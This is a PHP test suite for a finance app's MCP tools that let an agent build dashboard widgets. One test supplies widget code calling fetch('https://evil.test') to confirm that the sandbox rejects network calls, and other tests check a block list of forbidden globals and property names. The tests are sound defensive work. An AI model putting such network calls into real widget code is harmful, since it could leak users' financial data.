<?php

use App\Enums\WidgetHeight;
use App\Enums\WidgetOrigin;
use App\Enums\WidgetWidth;
use App\Mcp\Resources\WidgetPreview;
use App\Mcp\Servers\WhisperMoneyServer;
use App\Mcp\Tools\CreateDashboard;
use App\Mcp\Tools\CreateWidget;
use App\Mcp\Tools\GetWidget;
use App\Mcp\Tools\GetWidgetSdk;
use App\Mcp\Tools\ListDashboards;
use App\Mcp\Tools\PlaceWidget;
use App\Mcp\Tools\RemoveWidget;
use App\Mcp\Tools\UpdateWidget;
use App\Models\Account;
use App\Models\Category;
use App\Models\Dashboard;
use App\Models\DashboardWidget;
use App\Models\Label;
use App\Models\User;
use App\Models\WidgetDefinition;
use App\Services\Widgets\WidgetCompiler;
use App\Services\Widgets\WidgetDefinitionService;
use Laravel\Mcp\Server\Testing\TestResponse;

/**
 * Call a dashboard tool as $user with a read & write token.
 *
 * @param  class-string  $tool
 * @param  array<string, mixed>  $arguments
 */
function callDashboardTool(User $user, string $tool, array $arguments = []): TestResponse
{
    $user->withAccessToken($user->createToken('mcp', ['mcp:read', 'mcp:write'])->accessToken);

    return WhisperMoneyServer::actingAs($user)->tool($tool, $arguments);
}

/**
 * The JSON-RPC result of a tool call, `_meta` included.
 *
 * @return array<string, mixed>
 */
function dashboardToolResult(TestResponse $response): array
{
    return (fn (): array => $this->response->toArray()['result'])->call($response);
}

/**
 * The JSON the tool answered with.
 *
 * @return array<string, mixed>
 */
function dashboardToolJson(TestResponse $response): array
{
    return json_decode(dashboardToolResult($response)['content'][0]['text'], true, flags: JSON_THROW_ON_ERROR);
}

/**
 * @param  array<string, mixed>  $overrides
 * @return array<string, mixed>
 */
function mcpWidgetManifest(array $overrides = []): array
{
    return [
        'name' => 'Supermercado por mes',
        'size' => ['width' => '1/2', 'height' => 'm', 'allowed_widths' => ['1/2', '1/1']],
        'data' => [
            'accounts' => ['endpoint' => 'GET /accounts'],
        ],
        ...$overrides,
    ];
}

function mcpWidgetSource(): string
{
    return <<<'TSX'
        import { useWidgetData, Amount } from '@whisper-money/widget-sdk';

        export default function Widget() {
            const { accounts } = useWidgetData();

            return (
                <div className="flex h-full flex-col gap-2 p-4">
                    <p className="text-sm text-muted-foreground">Cuentas: {accounts.data.length}</p>
                    <Amount amount={1234} currency="EUR" />
                </div>
            );
        }
        TSX;
}

function savedMcpWidget(User $user, array $manifest = []): WidgetDefinition
{
    return app(WidgetDefinitionService::class)->create($user, mcpWidgetManifest($manifest), mcpWidgetSource(), WidgetOrigin::Mcp);
}

describe('dashboards', function () {
    it('lists the user\'s dashboards, what is on them and every widget they have', function () {
        $user = User::factory()->create();
        $dashboard = Dashboard::factory()->for($user)->create(['name' => 'Gastos']);
        $user->forceFill(['default_dashboard_id' => $dashboard->id])->save();
        $widget = WidgetDefinition::factory()->for($user)->create(['name' => 'Supermercado']);
        $placement = DashboardWidget::factory()->create(['dashboard_id' => $dashboard->id, 'widget_definition_id' => $widget->id, 'width' => '1/2', 'height' => 'm']);
        Dashboard::factory()->create(['name' => 'Someone else\'s']);

        $json = dashboardToolJson(callDashboardTool($user, ListDashboards::class)->assertOk());

        expect($json['default_dashboard_id'])->toBe($dashboard->id)
            ->and($json['dashboards'])->toHaveCount(1)
            ->and($json['dashboards'][0])->toMatchArray(['id' => $dashboard->id, 'name' => 'Gastos', 'is_default' => true])
            ->and($json['dashboards'][0]['widgets'][0])->toMatchArray(['placement_id' => $placement->id, 'widget_id' => $widget->id, 'width' => '1/2', 'height' => 'm'])
            ->and($json['widgets'][0])->toMatchArray(['id' => $widget->id, 'name' => 'Supermercado', 'last_error' => null]);
    });

    it('creates a dashboard after the user\'s others', function () {
        $user = User::factory()->create();
        Dashboard::factory()->for($user)->create(['position' => 3]);

        $json = dashboardToolJson(callDashboardTool($user, CreateDashboard::class, ['name' => 'Supermercado'])->assertOk());

        expect($user->dashboards()->whereKey($json['id'])->sole())
            ->name->toBe('Supermercado')
            ->position->toBe(4)
            ->and($json['url'])->toContain($json['id']);
    });

    it('refuses a dashboard past the cap or without a name', function () {
        $user = User::factory()->create();

        callDashboardTool($user, CreateDashboard::class, ['name' => ''])->assertHasErrors();

        Dashboard::factory()->for($user)->count(Dashboard::MAX_PER_USER)->create();

        callDashboardTool($user, CreateDashboard::class, ['name' => 'One more'])
            ->assertHasErrors(['You can have up to '.Dashboard::MAX_PER_USER.' dashboards.']);
    });
});

describe('widget reference', function () {
    it('documents the SDK, the closed lists, the classes, the endpoints and the rules', function () {
        $json = dashboardToolJson(callDashboardTool(User::factory()->create(), GetWidgetSdk::class)->assertOk());

        expect($json['rules'])->not->toBeEmpty()
            ->and(implode("\n", $json['rules']))->toContain('<Amount', 'privacyMode', 'dark:', 'container', 'language', "get(obj, 'target')", 'network')
            ->and($json['modules']['@whisper-money/widget-sdk']['values'])->toContain('useWidgetData', 'useWidgetEnv', 'get', 'wm')
            ->and($json['modules']['@whisper-money/widget-sdk']['components'])->toHaveKey('Amount')
            ->and($json['modules']['recharts']['components']['Bar'])->toHaveKey('dataKey')
            ->and($json['modules']['react']['exports'])->toContain('useState')->not->toContain('useRef')
            ->and($json['globals'])->toContain('Math')->not->toContain('fetch')
            ->and($json['tags']['html'])->toContain('div')->not->toContain('img')
            ->and($json['forbidden_property_names'])->toContain('constructor', 'target')
            ->and($json['classes']['base'])->toContain('flex')
            ->and($json['classes']['container_variants']['variants'])->toContain('@sm:', '@3xl:')
            ->and($json['manifest']['widths'])->toBe(['1/3', '1/2', '1/1'])
            ->and($json['manifest']['heights'])->toBe(['m', 'l', 'a'])
            ->and($json['manifest']['variables'])->toBe(['{{range.from}}', '{{range.to}}'])
            ->and($json['manifest']['frames'])->toBe(['card', 'none'])
            ->and($json['manifest']['shape'])->toContain('frame?')
            ->and($json['manifest']['example_frameless']['frame'])->toBe('none')
            ->and($json['manifest']['example_frameless']['size']['height'])->toBe('a')
            ->and(implode("\n", $json['rules']))->toContain('frame: "none"', 'never nest cards', 'on a phone it grows with the widget', 'a (auto) is for content with a height of its own', 'never a')
            ->and(collect($json['endpoints'])->firstWhere('endpoint', 'GET /analytics/aggregate')['params'])->toHaveKeys(['group_by', 'from', 'to', 'category_ids'])
            ->and(collect($json['endpoints'])->firstWhere('endpoint', 'GET /transactions')['listable'])->toBeTrue();
    });

    it('documents <TransactionList>: every prop it takes, and an example that compiles', function () {
        $json = dashboardToolJson(callDashboardTool(User::factory()->create(), GetWidgetSdk::class)->assertOk());
        $docs = $json['component_docs']['TransactionList'];
        $props = array_values(array_diff(array_keys($json['modules']['@whisper-money/widget-sdk']['components']['TransactionList']), ['key']));

        expect(implode("\n", $json['rules']))->toContain('<TransactionList', 'not a hand-made Table')
            ->and(array_keys($docs['props']))->toEqualCanonicalizing($props)
            ->and($docs['example']['manifest']['data']['tx']['endpoint'])->toBe('GET /transactions');

        $compilation = app(WidgetCompiler::class)->compile($docs['example']['source']);

        expect($compilation->ok)->toBeTrue(json_encode($compilation->errors) ?: '');
    });
});

describe('widgets', function () {
    it('creates a widget from a manifest and TSX and hands its preview to the MCP App', function () {
        $user = User::factory()->create(['currency_code' => 'EUR']);
        Account::factory()->create(['user_id' => $user->id]);
        $category = Category::factory()->create(['user_id' => $user->id, 'name' => 'Moto', 'icon' => 'Car', 'color' => 'red']);
        $label = Label::factory()->create(['user_id' => $user->id, 'name' => 'Panigale', 'color' => 'blue']);

        $response = callDashboardTool($user, CreateWidget::class, ['manifest' => mcpWidgetManifest(), 'source' => mcpWidgetSource()])->assertOk();
        $json = dashboardToolJson($response);
        $preview = dashboardToolResult($response)['_meta']['whisper-money/widget-preview'];
        $widget = $user->widgetDefinitions()->sole();

        expect($json['saved'])->toBeTrue()
            ->and($json['widget'])->toMatchArray(['id' => $widget->id, 'name' => 'Supermercado por mes', 'revision' => 1, 'created_via' => 'mcp', 'source' => mcpWidgetSource()])
            ->and($json['widget'])->not->toHaveKey('compiled_js')
            ->and($json['data_failures'])->toBe([])
            ->and($preview)->toMatchArray(['widget_id' => $widget->id, 'revision' => 1, 'js' => $widget->compiled_js, 'size' => ['width' => '1/2', 'height' => 'm'], 'frame' => 'card', 'failures' => [], 'data_too_large' => false, 'currency' => 'EUR', 'chart_color_scheme' => 'colorful'])
            ->and($preview['data']['accounts']['data'])->toHaveCount(1)
            ->and($preview['categories'])->toContain(['id' => $category->id, 'name' => 'Moto', 'icon' => 'Car', 'color' => 'red', 'type' => $category->type->value, 'cashflow_direction' => $category->cashflow_direction->value, 'parent_id' => null])
            ->and($preview['labels'])->toBe([['id' => $label->id, 'name' => 'Panigale', 'color' => 'blue']]);
    });

    it('hands the frame the manifest asks for to the preview', function () {
        $user = User::factory()->create();

        $response = callDashboardTool($user, CreateWidget::class, ['manifest' => mcpWidgetManifest(['frame' => 'none']), 'source' => mcpWidgetSource()])->assertOk();

        expect(dashboardToolResult($response)['_meta']['whisper-money/widget-preview']['frame'])->toBe('none')
            ->and($user->widgetDefinitions()->sole()->manifest['frame'])->toBe('none');
    });

    it('hands back every reason a widget was not saved, where and why', function () {
        $user = User::factory()->create();

        $response = callDashboardTool($user, CreateWidget::class, [
            'manifest' => mcpWidgetManifest(['data' => ['accounts' => ['endpoint' => 'DELETE /accounts']]]),
            'source' => "export default function W() { return <div>{fetch('https://evil.test')}</div>; }",
        ])->assertHasErrors();
        $errors = json_decode(dashboardToolResult($response)['content'][0]['text'], true)['errors'];

        expect(collect($errors)->pluck('path'))->toContain('manifest.data.accounts.endpoint')
            ->and(collect($errors)->firstWhere('path', 'manifest.data.accounts.endpoint')['message'])->toContain('only GET endpoints')
            ->and(collect($errors)->first(fn (array $error): bool => str_starts_with($error['path'], 'source:'))['message'])->toContain('fetch')
            ->and($user->widgetDefinitions()->exists())->toBeFalse();
    });

    it('tells the agent which data calls the API refuses, which the dashboard would show instead of the widget', function () {
        $user = User::factory()->create();
        $manifest = mcpWidgetManifest(['data' => ['accounts' => ['endpoint' => 'GET /analytics/aggregate', 'params' => ['group_by' => ['nonsense']]]]]);

        $response = callDashboardTool($user, CreateWidget::class, ['manifest' => $manifest, 'source' => mcpWidgetSource()])->assertOk();
        $failures = dashboardToolJson($response)['data_failures'];

        expect($failures)->toHaveCount(1)
            ->and($failures[0])->toMatchArray(['key' => 'accounts', 'status' => 422])
            ->and($failures[0]['message'])->not->toBeEmpty()
            ->and(dashboardToolResult($response)['_meta']['whisper-money/widget-preview']['failures'])->toBe($failures);
    });

    it('saves a fix as a new revision, keeping what was not passed, and clears the old error', function () {
        $user = User::factory()->create();
        $widget = savedMcpWidget($user);
        app(WidgetDefinitionService::class)->recordError($widget, 1, ['phase' => 'render', 'message' => 'accounts is undefined', 'stack' => null, 'component_stack' => null]);
        $fixed = str_replace('Cuentas', 'Mis cuentas', mcpWidgetSource());

        $json = dashboardToolJson(callDashboardTool($user, UpdateWidget::class, ['widget_id' => $widget->id, 'source' => $fixed])->assertOk());

        expect($json['widget'])->toMatchArray(['revision' => 2, 'source' => $fixed, 'last_error' => null])
            ->and($json['widget']['manifest'])->toEqual($widget->manifest)
            ->and(collect($json['widget']['revisions'])->pluck('number')->all())->toBe([2, 1]);
    });

    it('needs something to change', function () {
        $user = User::factory()->create();
        $widget = savedMcpWidget($user);

        callDashboardTool($user, UpdateWidget::class, ['widget_id' => $widget->id])
            ->assertHasErrors(['Pass the new manifest, the new source or both.']);
    });

    it('returns the last runtime error the dashboard caught, with its revision', function () {
        $user = User::factory()->create();
        $widget = savedMcpWidget($user);
        app(WidgetDefinitionService::class)->recordError($widget, 1, [
            'phase' => 'render',
            'message' => "Cannot read properties of undefined (reading 'length')",
            'stack' => "TypeError: Cannot read properties of undefined (reading 'length')\n    at k (data:text/javascript;charset=utf-8,import%7BuseMemo%20as%20g%7Dfrom%22data%3Atext%22;function%20k()%7B%7Dexport%7Bk%20as%20default%7D%3B:1:1816)",
            'component_stack' => null,
        ]);

        $json = dashboardToolJson(callDashboardTool($user, GetWidget::class, ['widget_id' => $widget->id])->assertOk());

        expect($json['widget']['last_error'])->toMatchArray([
            'revision' => 1,
            'phase' => 'render',
            'message' => "Cannot read properties of undefined (reading 'length')",
            'stack' => "TypeError: Cannot read properties of undefined (reading 'length')\n    at k (widget.js:1:1816)",
        ])->and($json['widget']['last_error']['at'])->not->toBeNull();
    });

    it('places a widget at its default size or one its manifest allows, never another', function () {
        $user = User::factory()->create();
        $dashboard = Dashboard::factory()->for($user)->create();
        $widget = savedMcpWidget($user);

        $default = dashboardToolJson(callDashboardTool($user, PlaceWidget::class, ['dashboard_id' => $dashboard->id, 'widget_id' => $widget->id])->assertOk());
        $wide = dashboardToolJson(callDashboardTool($user, PlaceWidget::class, ['dashboard_id' => $dashboard->id, 'widget_id' => $widget->id, 'width' => '1/1', 'height' => 'm'])->assertOk());

        callDashboardTool($user, PlaceWidget::class, ['dashboard_id' => $dashboard->id, 'widget_id' => $widget->id, 'width' => '1/3', 'height' => 'm'])
            ->assertHasErrors()
            ->assertSee('does not admit the size 1/3');

        expect($default)->toMatchArray(['placed' => true, 'width' => '1/2', 'height' => 'm'])
            ->and($wide)->toMatchArray(['width' => '1/1', 'height' => 'm'])
            ->and($dashboard->widgets()->get())
            ->toHaveCount(2)
            ->each(fn ($placement) => $placement->height->toBe(WidgetHeight::Medium))
            ->and($dashboard->widgets()->pluck('width')->map->value->all())->toBe([WidgetWidth::Half->value, WidgetWidth::Full->value]);
    });

    it('places a widget at the auto height only when its manifest allows it', function () {
        $user = User::factory()->create();
        $dashboard = Dashboard::factory()->for($user)->create();
        $fixed = savedMcpWidget($user);
        $auto = savedMcpWidget($user, ['name' => 'KPIs', 'size' => ['width' => '1/1', 'height' => 'm', 'allowed_heights' => ['m', 'a']]]);

        callDashboardTool($user, PlaceWidget::class, ['dashboard_id' => $dashboard->id, 'widget_id' => $fixed->id, 'width' => '1/2', 'height' => 'a'])
            ->assertHasErrors()
            ->assertSee('does not admit the size 1/2 × a');

        $placed = dashboardToolJson(callDashboardTool($user, PlaceWidget::class, ['dashboard_id' => $dashboard->id, 'widget_id' => $auto->id, 'width' => '1/1', 'height' => 'a'])->assertOk());

        expect($placed)->toMatchArray(['placed' => true, 'width' => '1/1', 'height' => 'a'])
            ->and($dashboard->widgets()->sole()->height)->toBe(WidgetHeight::Auto);
    });

    it('takes a widget off a dashboard and keeps the widget', function () {
        $user = User::factory()->create();
        $dashboard = Dashboard::factory()->for($user)->create();
        $widget = savedMcpWidget($user);
        $placement = app(WidgetDefinitionService::class)->place($dashboard, $widget);

        callDashboardTool($user, RemoveWidget::class, ['dashboard_id' => $dashboard->id, 'placement_id' => $placement->id])
            ->assertOk()
            ->assertSee('"removed":true');

        expect($dashboard->widgets()->exists())->toBeFalse()
            ->and($widget->fresh())->not->toBeNull();
    });
});

describe('permissions', function () {
    it('treats another user\'s dashboards and widgets as ones that do not exist', function (string $tool, Closure $arguments, string $message) {
        $user = User::factory()->create();
        $other = User::factory()->create();
        $theirDashboard = Dashboard::factory()->for($other)->create();
        $theirWidget = savedMcpWidget($other);
        $ownDashboard = Dashboard::factory()->for($user)->create();
        $ownWidget = savedMcpWidget($user);
        $theirPlacement = app(WidgetDefinitionService::class)->place($theirDashboard, $theirWidget);

        callDashboardTool($user, $tool, $arguments($theirDashboard, $theirWidget, $ownDashboard, $ownWidget, $theirPlacement))
            ->assertHasErrors()
            ->assertSee($message);

        expect($theirWidget->fresh()->revision)->toBe(1)
            ->and($theirDashboard->widgets()->count())->toBe(1);
    })->with([
        'get_widget' => [GetWidget::class, fn ($dashboard, $widget) => ['widget_id' => $widget->id], 'No widget with id'],
        'update_widget' => [UpdateWidget::class, fn ($dashboard, $widget) => ['widget_id' => $widget->id, 'source' => mcpWidgetSource()], 'No widget with id'],
        'place their widget' => [PlaceWidget::class, fn ($dashboard, $widget, $ownDashboard) => ['dashboard_id' => $ownDashboard->id, 'widget_id' => $widget->id], 'No widget with id'],
        'place on their dashboard' => [PlaceWidget::class, fn ($dashboard, $widget, $ownDashboard, $ownWidget) => ['dashboard_id' => $dashboard->id, 'widget_id' => $ownWidget->id], 'No dashboard with id'],
        'remove from their dashboard' => [RemoveWidget::class, fn ($dashboard, $widget, $ownDashboard, $ownWidget, $placement) => ['dashboard_id' => $dashboard->id, 'placement_id' => $placement->id], 'No dashboard with id'],
        'remove their placement through own dashboard' => [RemoveWidget::class, fn ($dashboard, $widget, $ownDashboard, $ownWidget, $placement) => ['dashboard_id' => $ownDashboard->id, 'placement_id' => $placement->id], 'No widget placed with id'],
    ]);

    it('refuses a read-only token on the write tools', function () {
        $user = User::factory()->create();
        $user->withAccessToken($user->createToken('mcp', ['mcp:read'])->accessToken);

        WhisperMoneyServer::actingAs($user)->tool(CreateDashboard::class, ['name' => 'Nope'])
            ->assertHasErrors(['This token is read-only. Create a read & write token to make changes.']);
    });
});

describe('gate', function () {
    $tools = [
        'list_dashboards' => [ListDashboards::class],
        'create_dashboard' => [CreateDashboard::class],
        'get_widget_sdk' => [GetWidgetSdk::class],
        'create_widget' => [CreateWidget::class],
        'update_widget' => [UpdateWidget::class],
        'get_widget' => [GetWidget::class],
        'place_widget' => [PlaceWidget::class],
        'remove_widget' => [RemoveWidget::class],
    ];

    it('tells the agent the user needs the Standard plan, with the upgrade link', function (string $tool) {
        config(['subscriptions.enabled' => true]);

        callDashboardTool(User::factory()->create(), $tool)
            ->assertHasErrors()
            ->assertSee(['Custom dashboards and widgets are part of the paid Standard plan', route('subscribe')]);
    })->with($tools);

    it('works on the Standard plan with subscriptions on', function () {
        config(['subscriptions.enabled' => true]);

        callDashboardTool(User::factory()->subscribed()->create(), ListDashboards::class)->assertOk();
    });

    it('is closed to the shared demo and press accounts', function (string $tool, string $account) {
        config(["app.{$account}.email" => "{$account}@example.test"]);

        callDashboardTool(User::factory()->create(['email' => "{$account}@example.test"]), $tool)
            ->assertHasErrors()
            ->assertSee('not available on the shared demo and press accounts');
    })->with($tools)->with(['demo', 'press']);
});

describe('preview app', function () {
    it('is linked from the widget tools', function () {
        foreach ([CreateWidget::class, UpdateWidget::class, GetWidget::class] as $tool) {
            expect((new $tool)->toArray()['_meta']['ui']['resourceUri'])->toBe('ui://whisper-money/widget-preview');
        }
    });

    it('serves the whole preview inline, as an MCP App', function () {
        $directory = public_path('build/widget-preview');
        $built = is_dir($directory);
        $files = ['widget-preview.js' => 'const end = "</script>"; document.title = "preview";', 'widget-preview.css' => '.wm-widget{container-type:inline-size}'];

        if (! $built) {
            mkdir($directory, recursive: true);

            foreach ($files as $file => $contents) {
                file_put_contents("{$directory}/{$file}", $contents);
            }
        }

        try {
            $response = WhisperMoneyServer::actingAs(User::factory()->create())->resource(WidgetPreview::class);
            $result = (fn (): array => $this->response->toArray()['result'])->call($response);
            $content = $result['contents'][0];

            expect($content['uri'])->toBe('ui://whisper-money/widget-preview')
                ->and($content['mimeType'])->toBe('text/html;profile=mcp-app')
                ->and($content['_meta']['ui']['prefersBorder'])->toBeTrue()
                ->and($content['text'])->toStartWith('<!DOCTYPE html>')
                ->toContain('<div id="widget-preview"></div>', '<script type="module">', 'createMcpApp', '.wm-widget')
                // The MCP SDK's and the preview's own: none inside the inlined code.
                ->and(substr_count(strtolower($content['text']), '</script>'))->toBe(2);
        } finally {
            if (! $built) {
                foreach (array_keys($files) as $file) {
                    unlink("{$directory}/{$file}");
                }

                rmdir($directory);
            }
        }
    });
});
